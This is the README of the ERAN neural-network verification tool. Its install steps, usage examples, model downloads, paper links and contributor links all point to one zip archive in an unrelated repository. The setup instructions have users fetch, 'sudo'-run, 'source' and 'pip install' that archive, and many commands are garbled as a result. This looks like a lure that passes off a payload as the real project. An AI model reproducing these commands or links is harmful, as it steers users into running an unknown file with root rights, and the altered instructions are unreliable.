ERAN <img width="100" alt="portfolio_view" align="right" src="https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip">
========

![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)

ETH Robustness Analyzer for Neural Networks (ERAN) is a state-of-the-art sound, precise, scalable, and extensible analyzer based on [abstract interpretation](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) for the complete and incomplete verification of MNIST, CIFAR10, and ACAS Xu based networks. ERAN produces state-of-the-art precision and performance for both complete and incomplete verification and can be tuned to provide best precision and scalability (see recommended configuration settings at the bottom). ERAN is developed at the [SRI Lab, Department of Computer Science, ETH Zurich](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) as part of the [Safe AI project](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip). The goal of ERAN is to automatically verify safety properties of neural networks with feedforward, convolutional, and residual layers against input perturbations (e.g.,  L∞-norm attacks, geometric transformations, etc). 

ERAN supports networks with ReLU, Sigmoid and Tanh activations and is sound under floating point arithmetic. It employs custom abstract domains which are specifically designed for the setting of neural networks and which aim to balance scalability and precision. Specifically, ERAN supports the following four analysis:

* DeepZ [NIPS'18]: contains specialized abstract Zonotope transformers for handling ReLU, Sigmoid and Tanh activation functions.

* DeepPoly [POPL'19]: based on a domain that combines floating point Polyhedra with Intervals.

* RefineZono [ICLR'19]: combines DeepZ analysis with MILP and LP solvers for more precision. 

* RefinePoly [NeurIPS'19]: combines DeepPoly analysis with MILP and k-ReLU framework for state-of-the-art precision while maintaining scalability.

All analysis are implemented using the [ELINA](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) library for numerical abstractions. More details can be found in the publications below. 

ERAN vs AI2
--------------------
Note that ERAN subsumes the first abstract interpretation based analyzer [AI2](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip), so if you aim to compare, please use ERAN as a baseline. 


USER MANUAL
--------------------
For a detailed desciption of the options provided and the implentation of ERAN, you can download the [user manual](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).

Requirements 
------------
GNU C compiler, ELINA, Gurobi's Python interface,

python3.6 or higher, tensorflow 1.11 or higher, numpy.


Installation
------------
Clone the ERAN repository via git as follows:
```
git clone https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd ERAN
```

The dependencies for ERAN can be installed step by step as follows (sudo rights might be required):

Install m4:
```
wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
tar -xvzf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd m4-1.4.1
./configure
make
make install
cp src/m4 /usr/bin
cd ..
rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
```

Install gmp:
```
wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd gmp-6.1.2
./configure --enable-cxx
make
make install
cd ..
rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
```

Install mpfr:
```
wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd mpfr-4.0.2
./configure
make
make install
cd ..
rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
```

Install cddlib:
```
wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd cddlib-0.94j
./configure
make
make install
cd ..
rm https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

```

Install ELINA:
```
git clone https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd ELINA
./configure -use-deeppoly
make
make install
cd ..
```

Install Gurobi:
```
wget https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
tar -xvf https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd gurobi900/linux64/src/build
sed -ie 's/^C++FLAGS =.*$/& -fPIC/' Makefile
make
cp libgurobi_c++.a ../../lib/
cd ../../
cp https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip /usr/lib
python3 https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip install
cd ../../

```

Update environment variables:
```
export GUROBI_HOME="Current_directory/gurobi900/linux64"
export PATH="${PATH}:${GUROBI_HOME}/bin"
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib:${GUROBI_HOME}/lib

```

Install DeepG (note that with an already existing version of ERAN you have to start at step Install Gurobi):
```
git clone https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
cd deepg/code
mkdir build
make shared_object
cp https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip /usr/lib
cd ../..

```

We also provide scripts that will install ELINA and all the necessary dependencies. One can run it as follows:

```
sudo https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
source https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

```


Note that to run ERAN with Gurobi one needs to obtain an academic license for gurobi from https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

To install the remaining python dependencies (numpy and tensorflow), type:

```
pip3 install -r https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
```

ERAN may not be compatible with older versions of tensorflow (we have tested ERAN with versions >= 1.11.0), so if you have an older version and want to keep it, then we recommend using the python virtual environment for installing tensorflow.


Usage
-------------

```
cd tf_verify

python3 . --netname <path to the network file> --epsilon <float between 0 and 1> --domain <deepzono/deeppoly/refinezono/refinepoly> --dataset <mnist/cifar10/acasxu> --zonotope <path to the zonotope specfile>  [optional] --complete <True/False> --timeout_lp <float> --timeout_milp <float> --use_area_heuristic <True/False> --mean <float(s)> --std <float(s)> --use_milp <True/False> --use_2relu --use_3relu --dyn_krelu --numproc <int>
```

* ```<epsilon>```: specifies bound for the L∞-norm based perturbation (default is 0). This parameter is not required for testing ACAS Xu networks.

* ```<zonotope>```: The Zonotope specification file can be comma or whitespace separated file where the first two integers can specify the number of input dimensions D and the number of error terms per dimension N. The following D*N doubles specify the coefficient of error terms. For every dimension i, the error terms are numbered from 0 to N-1 where the 0-th error term is the central error term. See an example here [https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip]. This option only works with the "deepzono" or "refinezono" domain.

* ```<use_area_heuristic>```: specifies whether to use area heuristic for the ReLU approximation in DeepPoly (default is true).

* ```<mean>```: specifies mean used to normalize the data. If the data has multiple channels the mean for every channel has to be provided (e.g. for cifar10 --mean 0.485, 0.456, 0.406) (default is 0 for non-geometric mnist and 0.5 0.5 0.5 otherwise)

* ```<std>```: specifies standard deviation used to normalize the data. If the data has multiple channels the standard deviaton for every channel has to be provided (e.g. for cifar10 --std 0.2 0.3 0.2) (default is 1 1 1)

* ```<use_milp>```: specifies whether to use MILP (default is true).

* ```<sparse_n>```: specifies the size of "k" for the kReLU framework (default is 70).

* ```<numproc>```: specifies how many processes to use for MILP, LP and k-ReLU (default is the number of processors in your machine).


* ```<geometric>```: specifies whether to do geometric analysis (default is false).

* ```<geometric_config>```: specifies the geometric configuration file location.

* ```<data_dir>```: specifies the geometric data location.

* ```<num_params>```: specifies the number of transformation parameters (default is 0)

* ```<attack>```: specifies whether to verify attack images (default is false).

* ```<specnumber>```: the property number for the ACASXu networks

* Refinezono and RefinePoly refines the analysis results from the DeepZ and DeepPoly domain respectively using the approach in our ICLR'19 paper. The optional parameters timeout_lp and timeout_milp (default is 1 sec for both) specify the timeouts for the LP and MILP forumlations of the network respectively. 

* Since Refinezono and RefinePoly uses timeout for the gurobi solver, the results will vary depending on the processor speeds. 

* Setting the parameter "complete" (default is False) to True will enable MILP based complete verification using the bounds provided by the specified domain. 

* When ERAN fails to prove the robustness of a given network in a specified region, it searches for an adversarial example and prints an adversarial image within the specified adversarial region along with the misclassified label and the correct label. ERAN does so for both complete and incomplete verification. 



Example
-------------

L_oo Specification
```
python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --epsilon 0.1 --domain deepzono --dataset mnist
```

will evaluate the local robustness of the MNIST convolutional network (upto 35K neurons) with ReLU activation trained using DiffAI on the 100 MNIST test images. In the above setting, epsilon=0.1 and the domain used by our analyzer is the deepzono domain. Our analyzer will print the following:

* 'Verified safe' for an image when it can prove the robustness of the network 

* 'Verified unsafe' for an image for which it can provide a concrete adversarial example

* 'Failed' when it cannot. 

* It will also print an error message when the network misclassifies an image.

* the timing in seconds.

* The ratio of images on which the network is robust versus the number of images on which it classifies correctly.
 

Zonotope Specification
```
python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --zonotope https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --domain deepzono 
```

will check if the Zonotope specification specified in "zonotope_example" holds for the network and will output "Verified safe", "Verified unsafe" or "Failed" along with the timing.

Similarly, for the ACAS Xu networks, ERAN will output whether the property has been verified along with the timing.


ACASXu Specification
```
python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --dataset acasxu --domain deepzono  --specnumber 9
```
will run DeepZ for analyzing property 9 of ACASXu benchmarks. The ACASXU networks are in data/acasxu/nets directory and the one chosen for a given property is defined in the Reluplex paper. 

Geometric analysis

```
python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --geometric --geometric_config https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --num_params 1 --dataset mnist
```
will on the fly generate geometric perturbed images and evaluate the network against them. For more information on the geometric configuration file please see [Format of the configuration file in DeepG](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).


```
python3 . --netname https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip --geometric --data_dir ../deepg/examples/example1/ --num_params 1 --dataset mnist --attack
```
will evaluate the generated geometric perturbed images in the given data_dir and also evaluate generated attack images.


Recommended Configuration for Scalable Complete Verification
---------------------------------------------------------------------------------------------
Use the "deeppoly" or "deepzono" domain with "--complete True" option


Recommended Configuration for More Precise but relatively expensive Incomplete Verification
----------------------------------------------------------------------------------------------
Use the "refinepoly" domain with "--use_milp True", "--sparse_n 12", "--refine_neurons", "timeout_milp 10", and "timeout_lp 10" options

Recommended Configuration for Faster but relatively imprecise Incomplete Verification
-----------------------------------------------------------------------------------------------
Use the "deeppoly" domain


Publications
-------------
*  [Certifying Geometric Robustness of Neural Networks](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)

   Mislav Balunovic,  Maximilian Baader, Gagandeep Singh, Timon Gehr,  Martin Vechev
   
   NeurIPS 2019.


*  [Beyond the Single Neuron Convex Barrier for Neural Network Certification](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).
    
    Gagandeep Singh, Rupanshu Ganvir, Markus Püschel, and Martin Vechev. 
   
    NeurIPS 2019.

*  [Boosting Robustness Certification of Neural Networks](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).

    Gagandeep Singh, Timon Gehr, Markus Püschel, and Martin Vechev. 

    ICLR 2019.


*  [An Abstract Domain for Certifying Neural Networks](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip).

    Gagandeep Singh, Timon Gehr, Markus Püschel, and Martin Vechev. 

    POPL 2019.


*  [Fast and Effective Robustness Certification](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip). 

    Gagandeep Singh, Timon Gehr, Matthew Mirman, Markus Püschel, and Martin Vechev. 

    NeurIPS 2018.




Neural Networks and Datasets
---------------

We provide a number of pretrained MNIST and CIAFR10 defended and undefended feedforward and convolutional neural networks with ReLU, Sigmoid and Tanh activations trained with the PyTorch and TensorFlow frameworks. The adversarial training to obtain the defended networks is performed using PGD and [DiffAI](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip). 

| Dataset  |   Model  |  Type   | #units | #layers| Activation | Training Defense| Download |
| :-------- | :-------- | :-------- | :-------------| :-------------| :------------ | :------------- | :---------------:|
| MNIST   | 3x50 | fully connected | 110 | 3    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 3x100 | fully connected | 210 | 3    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 5x100 | fully connected | 510 | 5    | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x100 | fully connected | 510 | 6    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 9x100 | fully connected | 810 | 9    | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x200 | fully connected | 1,010 | 6   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 9x200 | fully connected | 1,610 | 9   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | ReLU  | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 |  6  | ReLU | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000  | 6   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 |  6  | Sigmoid | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6 |    Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 |  fully connected| 3,000 | 6   | Tanh | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   |  Tanh | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 4x1024 | fully connected | 3,072 | 4   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | PGD | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         |  ConvSmall | convolutional | 3,604 | 3  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 5,704 | 3  | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 5,704 | 3   | ReLU | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 5,704 | 3   | ReLU | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
|         | ConvMed | convolutional | 5,704 | 3   | Sigmoid | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
|         | ConvMed | convolutional | 5,704 | 3   | Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 5,704 | 3   | Tanh | PGD &epsilon;=0.1 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
|         | ConvMed | convolutional | 5,704 | 3   |  Tanh | PGD &epsilon;=0.3 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMaxpool | convolutional | 13,798 | 9 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | ConvBig | convolutional | 48,064 | 6  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvSuper | convolutional | 88,544 | 6  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | Skip      | Residual | 71,650 | 9 | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
| CIFAR10 | 4x100 | fully connected | 410 | 4 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | 6x100 | fully connected | 610 | 6 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | 9x200 | fully connected | 1,810 | 9 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | 6x500 | fully connected | 3,000 | 6   | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | ReLU | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | ReLU | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)| 
|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | Sigmoid | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)| 
|         | 6x500 | fully connected | 3,000 | 6   | Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | Tanh | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | 6x500 | fully connected | 3,000 | 6   | Tanh | PGD &epsilon;=0.0313 |  [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)| 
|         | 7x1024 | fully connected | 6,144 | 7 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvSmall | convolutional | 4,852 | 3 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | ConvSmall   | convolutional  | 4,852 | 3  | ReLU  | PGD | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | ConvSmall  | convolutional | 4,852 | 3  | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | ConvMed | convolutional | 7,144 | 3 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 7,144 | 3   | ReLU | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 7,144 | 3   | ReLU | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 7,144 | 3   | Sigmoid | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
|         | ConvMed | convolutional | 7,144 | 3   | Tanh | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 7,144 | 3   | Tanh | PGD &epsilon;=0.0078 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |
|         | ConvMed | convolutional | 7,144 | 3   | Tanh | PGD &epsilon;=0.0313 | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) |  
|         | ConvMaxpool | convolutional | 53,938 | 9 | ReLU | None | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)|
|         | ConvBig | convolutional | 62,464 | 6 | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 
|         | ResNet18 | Residual | 558K | 18 | ReLU | DiffAI | [:arrow_down:](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) | 

We provide the first 100 images from the testset of both MNIST and CIFAR10 datasets in the 'data' folder. Our analyzer first verifies whether the neural network classifies an image correctly before performing robustness analysis. In the same folder, we also provide ACAS Xu networks and property specifications.

Experimental Results
--------------
We ran our experiments for the feedforward networks on a 3.3 GHz 10 core Intel i9-7900X Skylake CPU with a main memory of 64 GB whereas our experiments for the convolutional networks were run on a 2.6 GHz 14 core Intel Xeon CPU E5-2690 with 512 GB of main memory. We first compare the precision and performance of DeepZ and DeepPoly vs [Fast-Lin](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) on the MNIST 6x100 network in single threaded mode. It can be seen that DeepZ has the same precision as Fast-Lin whereas DeepPoly is more precise while also being faster.

![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)

In the following, we compare the precision and performance of DeepZ and DeepPoly on a subset of the neural networks listed above in multi-threaded mode. In can be seen that DeepPoly is overall more precise than DeepZ but it is slower than DeepZ on the convolutional networks. 

![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)

![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)

![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)

![High Level](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)


The table below compares the performance and precision of DeepZ and DeepPoly on our large networks trained with DiffAI. 


<table aligh="center">
  <tr>
    <td>Dataset</td>
    <td>Model</td>
    <td>&epsilon;</td>
    <td colspan="2">% Verified Robustness</td>
    <td colspan="2">% Average Runtime (s)</td>
  </tr>
  <tr>
   <td> </td>
   <td> </td>
   <td> </td>
   <td> DeepZ </td>
   <td> DeepPoly </td>
   <td> DeepZ </td> 
   <td> DeepPoly </td>
  </tr>

<tr>
   <td> MNIST</td>
   <td> ConvBig</td>
   <td> 0.1</td>
   <td> 97 </td>
   <td> 97 </td>
   <td> 5 </td> 
   <td> 50 </td>
</tr>


<tr>
   <td> </td>
   <td> ConvBig</td>
   <td> 0.2</td>
   <td> 79 </td>
   <td> 78 </td>
   <td> 7 </td> 
   <td> 61 </td>
</tr>

<tr>
   <td> </td>
   <td> ConvBig</td>
   <td> 0.3</td>
   <td> 37 </td>
   <td> 43 </td>
   <td> 17 </td> 
   <td> 88 </td>
</tr>

<tr>
   <td> </td>
   <td> ConvSuper</td>
   <td> 0.1</td>
   <td> 97 </td>
   <td> 97 </td>
   <td> 133 </td> 
   <td> 400 </td>
</tr>

<tr>
   <td> </td>
   <td> Skip</td>
   <td> 0.1</td>
   <td> 95 </td>
   <td> N/A </td>
   <td> 29 </td> 
   <td> N/A </td>
</tr>

<tr>
   <td> CIFAR10</td>
   <td> ConvBig</td>
   <td> 0.006</td>
   <td> 50 </td>
   <td> 52 </td>
   <td> 39 </td> 
   <td> 322 </td>
</tr>


<tr>
   <td> </td>
   <td> ConvBig</td>
   <td> 0.008</td>
   <td> 33 </td>
   <td> 40 </td>
   <td> 46 </td> 
   <td> 331 </td>
</tr>


</table>


The table below compares the timings of complete verification with ERAN for all ACASXu benchmarks. 


<table aligh="center">
  <tr>
    <td>Property</td>
    <td>Networks</td>
    <td colspan="1">% Average Runtime (s)</td>
  </tr>
  
  <tr>
   <td> 1</td>
   <td> all 45</td>
   <td> 15.5 </td>
  </tr>

<tr>
   <td> 2</td>
   <td> all 45</td>
   <td> 11.4 </td>
  </tr>

<tr>
   <td> 3</td>
   <td> all 45</td>
   <td> 1.9 </td>
  </tr>
  
<tr>
   <td> 4</td>
   <td> all 45</td>
   <td> 1.1 </td>
  </tr>

<tr>
   <td> 5</td>
   <td> 1_1</td>
   <td> 26 </td>
  </tr>

<tr>
   <td> 6</td>
   <td> 1_1</td>
   <td> 10 </td>
  </tr>
  
<tr>
   <td> 7</td>
   <td> 1_9</td>
   <td> 83 </td>
  </tr>

<tr>
   <td> 8</td>
   <td> 2_9</td>
   <td> 111 </td>
  </tr>

<tr>
   <td> 9</td>
   <td> 3_3</td>
   <td> 9 </td>
  </tr>
  
<tr>
   <td> 10</td>
   <td> 4_5</td>
   <td> 2.1 </td>
  </tr>

</table>


More experimental results can be found in our papers.

Contributors
--------------

* [Gagandeep Singh](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) (lead contact) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* Jonathan Maurer - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* Christoph Müller (contact for GPU version of DeepPoly) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* [Matthew Mirman](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* [Timon Gehr](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip
 
* Adrian Hoffmann - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* Mislav Balunovic (https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* Maximilian Baader (https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* [Petar Tsankov](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* [Dana Drachsler Cohen](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip 

* [Markus Püschel](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

* [Martin Vechev](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip) - https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip

License and Copyright
---------------------

* Copyright (c) 2020 [Secure, Reliable, and Intelligent Systems Lab (SRI), Department of Computer Science ETH Zurich](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
* Licensed under the [Apache License](https://raw.githubusercontent.com/kevinnjagi44/eran/master/Belleek/eran.zip)
